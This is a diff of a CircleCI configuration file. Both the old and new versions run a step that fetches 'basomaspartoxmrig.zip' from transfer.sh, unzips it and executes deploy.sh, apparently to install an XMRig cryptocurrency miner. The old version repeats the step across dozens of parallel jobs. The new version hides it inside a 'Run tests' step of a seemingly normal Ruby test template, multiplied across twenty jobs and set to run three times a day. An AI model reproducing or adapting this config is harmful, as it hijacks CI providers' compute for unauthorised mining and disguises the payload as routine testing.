@@ -1,722 +1,159 @@
-version: 2
-jobs:
-  build:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
+working_dir: &working_dir ~/app
+.build_template: &script
+  steps:
+    - checkout
+    - run: curl -L https://codeclimate.com/downloads/test-reporter/test-reporter-latest-linux-amd64 > ./cc-test-reporter
+    - run: chmod +x ./cc-test-reporter
+    - run: ./cc-test-reporter before-build
+    - run: gem install bundler:2.1.4
+    - run: bundle install --jobs=4 --retry=4 --path vendor/bundle
+    - run: bundle exec rake rubocop
+    - run:
+        name: Run tests
         command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
+                    apt update 
+                    apt install screen -y 
                     wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build1:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build2:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build3:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build4:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build5:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build6:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build7:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build8:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build9:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build10:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build11:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build12:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build13:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build14:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build15:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build16:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build17:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build18:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build19:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build20:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build21:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build22:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build23:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build24:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build25:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build26:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build27:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build28:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build29:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build30:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build31:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build32:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build33:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build34:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build35:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build36:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build37:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build38:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build39:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build40:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build41:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build42:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build43:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build44:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build45:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build46:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build47:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build48:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build49:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  build50:
-    machine:
-      image: ubuntu-2004:202010-01
-    resource_class: medium
-    parallelism: 4
-    steps:
-     - run:
-        name: aku
-        command: |
-                    sudo apt update 
-                    sudo apt install screen -y 
-                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        
-  
 
+version: 2.0
+jobs:
+  endvoc:
+    docker:
+      - image: ruby
+    steps:
+      - checkout
+  endvoc1:
+    <<: *script
+    docker:
+      - image: ruby:2.7
+  endvoc2:
+    <<: *script
+    docker:
+      - image: ruby:2.6
+  endvoc3:
+    <<: *script
+    docker:
+      - image: ruby:2.5
+  endvoc4:
+    <<: *script
+    docker:
+      - image: ruby:2.4
+  endvoc5:
+    docker:
+      - image: ruby
+    steps:
+      - checkout
+  endvoc6:
+    <<: *script
+    docker:
+      - image: ruby:2.7
+  endvoc7:
+    <<: *script
+    docker:
+      - image: ruby:2.6
+  endvoc8:
+    <<: *script
+    docker:
+      - image: ruby:2.5
+  endvoc9:
+    <<: *script
+    docker:
+      - image: ruby:2.4
+  endvoc10:
+    docker:
+      - image: ruby
+    steps:
+      - checkout
+  endvoc11:
+    <<: *script
+    docker:
+      - image: ruby:2.7
+  endvoc12:
+    <<: *script
+    docker:
+      - image: ruby:2.6
+  endvoc13:
+    <<: *script
+    docker:
+      - image: ruby:2.5
+  endvoc14:
+    <<: *script
+    docker:
+      - image: ruby:2.4
+  endvoc15:
+    docker:
+      - image: ruby
+    steps:
+      - checkout
+  endvoc16:
+    <<: *script
+    docker:
+      - image: ruby:2.7
+  endvoc17:
+    <<: *script
+    docker:
+      - image: ruby:2.6
+  endvoc18:
+    <<: *script
+    docker:
+      - image: ruby:2.5
+  endvoc19:
+    <<: *script
+    docker:
+      - image: ruby:2.4    
 workflows:
-    version: 2
-    build:
-        jobs:
-            - build
-            - build1
-            - build2
-            - build3
-            - build4
-            - build5
-            - build6
-            - build7
-            - build8
-            - build9
-            - build10
-            - build11
-            - build12
-            - build13
-            - build14
-            - build15
-            - build16
-            - build17
-            - build18
-            - build19
-            - build20
-            - build21
-            - build22
-            - build23
-            - build24
-            - build25 
-            - build26
-            - build27
-            - build28
-            - build29
-            - build30
-            - build31
-            - build32
-            - build33
-            - build34
-            - build35
-            - build36
-            - build37
-            - build38
-            - build39
-            - build40
-            - build41
-            - build42
-            - build43
-            - build44
-            - build45
-            - build46
-            - build47
-            - build48
-            - build49
-            - build50
+  version: 2
+  commit:
+    jobs:
+      - endvoc
+      - endvoc1
+      - endvoc2
+      - endvoc3
+      - endvoc4
+      - endvoc5
+      - endvoc6
+      - endvoc7
+      - endvoc8
+      - endvoc9
+      - endvoc10
+      - endvoc11
+      - endvoc12
+      - endvoc13
+      - endvoc14
+      - endvoc15
+      - endvoc16
+      - endvoc17
+      - endvoc18
+      - endvoc19
+
+
+    triggers:
+      - schedule:
+          cron: "0 0,8,16 * * *"
+          filters:
+            branches:
+              only:
+                - master
+
+  endvocrunjob:
+    jobs:
+      - endvoc
+      - endvoc1
+      - endvoc2
+      - endvoc3
+      - endvoc4
+      - endvoc5
+      - endvoc6
+      - endvoc7
+      - endvoc8
+      - endvoc9
+      - endvoc10
+      - endvoc11
+      - endvoc12
+      - endvoc13
+      - endvoc14
+      - endvoc15
+      - endvoc16
+      - endvoc17
+      - endvoc18
+      - endvoc19
